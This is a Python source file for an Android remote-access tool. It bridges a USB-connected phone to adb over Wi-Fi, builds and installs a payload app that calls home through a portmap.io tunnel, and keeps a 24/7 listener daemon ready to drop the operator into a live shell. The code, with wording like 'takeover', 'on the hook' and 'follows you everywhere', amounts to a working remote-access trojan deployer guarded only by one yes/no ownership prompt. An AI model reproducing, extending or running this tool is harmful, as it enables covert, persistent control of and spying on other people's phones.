"""FOCUSED PRIMARY FLOWS — the only 3 things this CLI does:

  1) AUTO CONNECT : USB phone → tcpip:5555 Wi-Fi bridge → internet payload
                    (calls home to our 24/7 listener) → save device.
                    Every NEW phone: asks about portmap if not configured yet.
  2) RECONNECT    : pick a saved phone → live shell (over internet via keeper).
  3) PORTMAP      : one-time permanent-tunnel setup.

Everything rides the keeper daemon (watchdog): tunnel + listener stay up 24/7,
the phone dials home by itself, sessions survive operator detach.
"""
from __future__ import annotations

import subprocess
import sys
import time
from pathlib import Path

from rich.panel import Panel

from modules import remoteshell
from modules.config import AppConfig
from modules.console import (
    console,
    ask,
    confirm,
    print_error,
    print_success,
    print_warning,
)

REPO = Path(__file__).resolve().parent.parent
KEEPER = REPO / "modules" / "keeper.py"
PKG = remoteshell.PKG


# --------------------------------------------------------------------------
# keeper helpers
# --------------------------------------------------------------------------

def keeper_status(timeout: float = 4.0) -> dict | None:
    try:
        from modules.keeper import ctl

        return ctl({"cmd": "status"}, timeout=timeout)
    except Exception:
        return None


def ensure_keeper() -> bool:
    """Keeper running? If not: systemd start, else spawn detached."""
    if keeper_status():
        return True
    subprocess.run(
        ["systemctl", "--user", "start", "dls-keeper.service"],
        capture_output=True, timeout=15,
    )
    time.sleep(2.5)
    if keeper_status():
        return True
    # last resort: bare daemon (survives until reboot)
    subprocess.Popen(
        [sys.executable, str(KEEPER), "daemon"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        start_new_session=True,
    )
    time.sleep(2.5)
    return keeper_status() is not None


def restart_keeper() -> None:
    subprocess.run(
        ["systemctl", "--user", "restart", "dls-keeper.service"],
        capture_output=True, timeout=20,
    )
    time.sleep(3)
    if not keeper_status():
        ensure_keeper()


def _lan_wake(ip: str) -> bool:
    """Phone reachable on LAN? Wake the payload app so it dials home now."""
    if not ip:
        return False
    try:
        subprocess.run(["adb", "connect", f"{ip}:5555"], capture_output=True, timeout=10)
        time.sleep(1)
        for args in (
            ["shell", "am", "startservice", "-n", f"{PKG}/.MainService"],
            ["shell", "am", "start", "-n", f"{PKG}/.MainActivity"],
        ):
            r = subprocess.run(["adb", "-s", f"{ip}:5555", *args], capture_output=True, timeout=10)
            if r.returncode == 0:
                return True
    except Exception:
        pass
    return False


# --------------------------------------------------------------------------
# 1) AUTO CONNECT
# --------------------------------------------------------------------------

def auto_connect(config: AppConfig) -> None:
    console.print(
        "\n[bold cyan]▸ AUTO CONNECT[/bold cyan]  "
        "[dim]USB → Wi-Fi bridge → payload → saved forever[/dim]\n"
    )

    # ---- 1. find the phone (USB preferred, already-bridged Wi-Fi ok) ------
    serial = None
    source = "USB"
    for i in range(10):
        serial = remoteshell.first_device(allowed_wifi=False)
        source = "USB"
        if not serial:
            serial = remoteshell.first_device(allowed_wifi=True)
            source = "Wi-Fi (already bridged)"
        if serial:
            break
        if i == 0:
            console.print("[dim]no phone yet — plug USB… (waiting)[/dim]")
        time.sleep(2)
    if not serial:
        print_error("no phone found — enable USB debugging, plug cable, try again")
        return
    print_success(f"phone found [{source}]: {serial}")

    # ---- 2. create the Wi-Fi bridge (USB only) ----------------------------
    if ":" not in serial:
        console.print("[dim]creating Wi-Fi bridge (tcpip 5555)…[/dim]")
        remoteshell._a(serial, ["tcpip", "5555"])
        time.sleep(2)
        ip = remoteshell.read_wifi_ip(serial)
        if not ip:
            print_error("could not read phone Wi-Fi IP — is phone on Wi-Fi?")
            return
        remoteshell._a(serial, ["connect", f"{ip}:5555"])
        time.sleep(2)
        serial = f"{ip}:5555"
        r = subprocess.run(["adb", "devices"], capture_output=True, text=True)
        if serial not in r.stdout:
            print_error(f"bridge failed — {serial} not online")
            return
        print_success(f"bridge up: {serial}  (cable can be unplugged now)")

    # ---- 3. identify + authorize ------------------------------------------
    from modules.devices import add_or_update, device_info

    info = device_info(serial)
    name = info.get("name") or serial
    console.print(f"  [dim]model:[/dim] [white]{name}[/white]")
    if not confirm(f"[bold]Is {name} YOUR OWN phone?[/bold] authorize takeover? (Y/N)"):
        print_warning("not authorized — nothing done")
        return

    # ---- 4. portmap (asked for EVERY new phone when missing) ---------------
    pm = remoteshell.loadportmap_config()
    fresh_pm = False
    if not pm:
        if confirm(
            "[bold]No permanent tunnel configured.[/bold] "
            "Set up portmap.io NOW so this phone reaches you from ANY network? (Y/N)"
        ):
            from modules.tunnel import portmap_setup_interactive

            pm = portmap_setup_interactive()
            fresh_pm = pm is not None
        else:
            print_warning("ok — LOCAL-only payload (works only while USB/LAN adb is up)")

    # ---- 5. build + install the calling-home payload -----------------------
    if pm:
        lhost, lport = pm.get("dial_host", ""), int(pm.get("public_port", 31107))
        kind = f"INTERNET  (dials {lhost}:{lport} from anywhere)"
        console.print(f"\n[dim]building internet payload → {kind}… (1-2 min)[/dim]")
        apk = remoteshell.build_fgs_payload(lhost, lport)
    else:
        kind = f"LOCAL  (127.0.0.1:{remoteshell.LPORT} via adb reverse)"
        console.print("\n[dim]building local payload…[/dim]")
        apk = remoteshell.build_fgs_payload("127.0.0.1", remoteshell.LPORT)
    if not apk:
        print_error("payload build failed")
        return

    if not remoteshell.install_and_launch(serial, apk):
        return
    if not pm:
        remoteshell.set_reverse(serial, remoteshell.LPORT)

    add_or_update(serial, authorized=True)
    print_success(f"{name} SAVED — reconnect anytime with option 2")

    # ---- 6. keeper catches the call home -----------------------------------
    if fresh_pm:
        restart_keeper()
    if not ensure_keeper():
        print_error("keeper daemon could not start — see option 3/logs")
        return

    if pm:
        console.print("\n[dim]waiting for the phone to call home (max 60s)…[/dim]")
        live = False
        for _ in range(30):
            st = keeper_status()
            if st and st.get("session_alive"):
                live = True
                break
            time.sleep(2)
        if live:
            peer = (keeper_status() or {}).get("peer", "")
            print_success(f"LIVE SESSION — phone is on the hook!  peer={peer}")
        else:
            print_warning(
                "phone hasn't dialed yet — no problem: keeper is 24/7,\n"
                "it connects BY ITSELF whenever the phone is online (option 2 to check)"
            )

    # ---- 7. summary ---------------------------------------------------------
    st = keeper_status() or {}
    console.print(
        Panel(
            f"[bold green]{name}[/bold green] under ownership ✓\n\n"
            f"  payload   : {kind}\n"
            f"  listener  : keeper 24/7 @ 127.0.0.1:{st.get('lport', '?')}"
            f"  [dim](tunnel {st.get('tunnel', '?')})[/dim]\n"
            f"  endpoint  : [white]{st.get('endpoint') or '—'}[/white]\n"
            f"  session   : [white]{st.get('session')}[/white]"
            f"  [dim]alive={st.get('session_alive')}[/dim]\n\n"
            f"[dim]unplug the cable — the phone follows you everywhere.[/dim]",
            title="[bold cyan]✓ AUTO CONNECT COMPLETE[/bold cyan]",
            border_style="cyan",
        )
    )


# --------------------------------------------------------------------------
# 2) RECONNECT
# --------------------------------------------------------------------------

def reconnect(config: AppConfig) -> None:
    from modules.devices import load_store

    console.print("\n[bold cyan]▸ RECONNECT[/bold cyan]  your saved phone → live shell\n")
    devs = load_store()
    if not devs:
        print_warning("no saved devices — run 1 (AUTO CONNECT) first")
        return
    if len(devs) == 1:
        d = devs[0]
    else:
        for i, x in enumerate(devs, 1):
            console.print(f"  [white]{i}.[/white] {x.get('name') or x.get('serial')}")
        c = ask("[cyan]which phone[/cyan]> ").strip()
        if not (c.isdigit() and 1 <= int(c) <= len(devs)):
            print_error("invalid choice")
            return
        d = devs[int(c) - 1]

    name = d.get("name") or d["serial"]
    if not ensure_keeper():
        print_error("keeper not running — cannot listen")
        return

    st = keeper_status() or {}
    if not st.get("session_alive"):
        woke = _lan_wake(d.get("ip", ""))
        note = "sent LAN wake to the phone…" if woke else "phone not on LAN — waiting for it to dial home…"
        console.print(f"\n[dim]{note} (max 90s)[/dim]")
        for _ in range(45):
            st = keeper_status()
            if st and st.get("session_alive"):
                break
            time.sleep(2)
        st = keeper_status() or {}

    if not st.get("session_alive"):
        print_warning(
            f"{name} is offline right now.\n"
            "  keeper is watching 24/7 — the SECOND the phone gets internet,\n"
            "  it lands here by itself. try again later."
        )
        return

    print_success(f"LIVE SESSION from {name}  (since {st.get('since')})")
    console.print("[dim]entering shell — 'exit' detaches, session stays alive[/dim]\n")
    try:
        subprocess.run([sys.executable, str(KEEPER), "attach"])
    except KeyboardInterrupt:
        pass
    console.print("\n[dim]detached — session kept alive, phone still on the hook.[/dim]")


# --------------------------------------------------------------------------
# 3) PORTMAP SETUP
# --------------------------------------------------------------------------

def portmap_setup(config: AppConfig) -> None:
    console.print("\n[bold cyan]▸ PORTMAP SETUP[/bold cyan]  permanent tunnel (one-time)\n")
    from modules.tunnel import portmap_setup_interactive

    cfg = portmap_setup_interactive()
    if not cfg:
        return
    console.print("[dim]restarting keeper to apply the new tunnel…[/dim]")
    restart_keeper()
    st = keeper_status() or {}
    if st.get("tunnel") == "up":
        print_success(f"permanent tunnel LIVE: {st.get('endpoint')}")
    else:
        print_warning("tunnel not up yet — keeper keeps retrying in background")


# --------------------------------------------------------------------------
# MY DEVICES (small helper view, opened from nowhere by default)
# --------------------------------------------------------------------------

def devices_brief() -> None:
    from modules.devices import load_store

    devs = load_store()
    if not devs:
        print("no saved devices")
        return
    for i, d in enumerate(devs, 1):
        mark = "🟢" if d.get("authorized") else "⚪"
        print(f"{i}. {mark} {d.get('name','?'):24s} {d.get('serial','?')}  ip={d.get('ip','—')}")
